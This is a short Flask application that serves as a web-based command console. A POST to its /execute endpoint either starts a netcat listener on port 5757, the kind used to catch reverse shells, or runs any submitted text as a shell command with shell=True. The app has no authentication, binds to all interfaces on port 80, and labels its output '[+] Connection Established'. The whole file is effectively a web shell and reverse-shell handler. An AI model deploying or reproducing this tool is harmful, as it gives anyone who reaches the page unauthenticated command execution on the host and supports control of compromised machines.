from flask import Flask, request, render_template, jsonify

import subprocess
import threading
import time

app = Flask(__name__)

# Flag to track if a connection has been established
connection_established = False
listener_thread = None

# Function to run the Netcat listener
def start_netcat_listener():
    global connection_established
    while True:
        if not connection_established:
            try:
                subprocess.check_output(["nc", "-lvnp", "5757"])
                connection_established = True
            except subprocess.CalledProcessError:
                pass

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/execute', methods=['POST'])
def execute():
    global connection_established, listener_thread
    if request.method == 'POST':
        command = request.form['command']
        if command == "listen":
            if not connection_established:
                listener_thread = threading.Thread(target=start_netcat_listener)
                listener_thread.daemon = True
                listener_thread.start()
                connection_established = True
                return jsonify({'output': 'Listener started successfully.'})
            else:
                return jsonify({'output': 'Listener is already running.'})
        else:
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                if connection_established:
                    response = "[+] Connection Established\n" + result.decode()
                else:
                    response = result.decode()
                return jsonify({'output': response})
            except subprocess.CalledProcessError as e:
                return jsonify({'output': str(e.output)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
